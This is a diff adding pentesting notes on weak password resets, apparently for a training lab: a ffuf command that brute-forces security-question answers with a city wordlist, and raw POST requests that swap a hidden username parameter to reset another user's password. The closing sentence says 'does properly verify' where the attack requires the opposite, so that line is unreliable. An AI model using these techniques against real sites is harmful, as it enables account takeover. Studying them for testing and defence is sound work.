@@ -59,4 +59,45 @@ The abbreviation stands for: Completely Automated Public Turing test to tell Com
 [CIRT.net](https://www.cirt.net/passwords) is a database for default credentials. Further resources include [SecLists Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials) as well as the [SCADA](https://github.com/scadastrangelove/SCADAPASS/tree/master) GitHub repository which contains a list of default passwords for a variety of different vendors.
 You should always search for default credentials in case you find the used technology/device.
 
+# Vulnerable Password Reset
+## Guessable Password Reset Questions
+These questions can often be obtained through OSINT or guessed, given a sufficient number of attempts, i.e., a lack of brute-force protection. <br>
+For instance, [this](https://github.com/datasets/world-cities/blob/main/data/world-cities.csv) CSV file contains a list of more than 25,000 cities with more than 15,000 inhabitants from all over the world.
+```
+cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
+```
+We could narrow down the cities if we had additional information:
+```
+cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt
+```
+Check:
+```
+wc -l german_cities.txt
+```
+Brute-force the answer:
+```
+ffuf -w ./german_cities.txt -u http://$ip:$port/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "<incorrect_response>"
+```
+## Manipulating the Reset Request
+Another instance of a flawed password reset logic occurs when a user can manipulate a potentially hidden parameter to reset the password of a different account.
+Suppose supplying the security response London results in the following request:
+```
+POST /security_question.php HTTP/1.1
+Host: pwreset.htb
+Content-Length: 43
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv
 
+security_response=London&username=htb-stdnt
+```
+So the username is contained in the form as a hidden parameter and sent along with the security response. Then we can reset the user's password and the final request looks like this:
+```
+POST /reset_password.php HTTP/1.1
+Host: pwreset.htb
+Content-Length: 36
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv
+
+password=P@$$w0rd&username=htb-stdnt
+```
+Like the previous request, the request contains the username in a separate POST parameter. Suppose the web application does properly verify that the usernames in both requests match. In that case, we can skip the security question or supply the answer to our security question and then set the password of an entirely different account.
